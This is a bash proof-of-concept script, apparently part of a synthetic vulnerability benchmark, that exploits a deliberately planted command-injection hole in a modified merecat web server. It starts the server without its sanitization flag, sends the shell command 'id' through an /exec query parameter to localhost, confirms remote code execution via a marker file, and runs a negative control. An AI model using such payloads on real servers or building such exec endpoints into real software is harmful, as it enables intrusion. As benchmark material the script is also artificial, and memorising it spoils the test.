#!/usr/bin/env bash
# PoC for 060_merecat_C2I3S3
# Axes: C2 (struct with enabled+logging) / I3 (struct dispatch) / S3 (config-gated sanitization)
#
# Vulnerability: --strict-exec is omitted at startup, leaving the sanitization
# check inactive.  The command flows through an exec_args_t struct.
# Both gate flags required.
#
# Gate flags required: --exec-mode --exec-logging
# Exploit: omit --strict-exec so the sanitization path is never entered.
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/merecat"
WWWROOT="/tmp/poc_060_www"
MARKER="/tmp/poc_060_marker"
PORT=18060

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server (omit --strict-exec to bypass S3 sanitization) ───────────────
echo "[*] starting merecat with --exec-mode --exec-logging (no --strict-exec) on port $PORT..."
"$BINARY" -n -p "$PORT" "$WWWROOT" --exec-mode --exec-logging &
SERVER_PID=$!
sleep 2

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>$MARKER (flows through exec_args_t struct)"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent with only one gate flag ─────────────────
echo "[*] verifying gate: endpoint must be absent with only --exec-mode (no --exec-logging)..."
NEG_PORT=$((19000 + 60))
"$BINARY" -n -p $NEG_PORT "$WWWROOT" --exec-mode &
SAFE_PID=$!
sleep 2
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-logging"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
